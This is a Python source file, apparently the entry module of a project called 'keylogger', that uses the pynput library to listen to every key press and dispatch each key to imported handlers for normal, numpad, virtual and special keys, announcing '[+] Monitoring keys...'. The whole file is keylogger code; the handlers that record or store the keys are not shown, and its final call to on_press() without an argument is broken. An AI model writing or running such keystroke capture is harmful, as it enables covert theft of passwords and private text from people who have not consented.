from keylogger.handlers.normal import handle_normal_key
from keylogger.handlers.numpad import handle_numpad_key
from keylogger.handlers.special import handle_special_key
from keylogger.handlers.virtual import handle_virtual_code
from keylogger.utils.folder_create import LISTENER, IGNORE
from pynput import keyboard

def on_press(key):
    global LISTENER
    try:
        tecla = key.char
        if tecla is not None:
            handle_normal_key(tecla)
            return
        else:
            raise AttributeError
    except AttributeError:
        tecla_nome = str(key).replace("Key.", "").replace("'", "").lower()
        if tecla_nome in IGNORE:
            return
        if tecla_nome.startswith("num_") and tecla_nome[-1].isdigit():
            handle_numpad_key(tecla_nome)
        elif tecla_nome.startswith("<") and tecla_nome.endswith(">") and tecla_nome[1:-1].isdigit():
            handle_virtual_code(tecla_nome)
        else:
            handle_special_key(tecla_nome)

print("[+] Monitoring keys...")

with keyboard.Listener(on_press=on_press) as l:
    listener = l
    on_press.ctrl_pressed = False
    listener.join()

if __name__ == "__main__":
    on_press()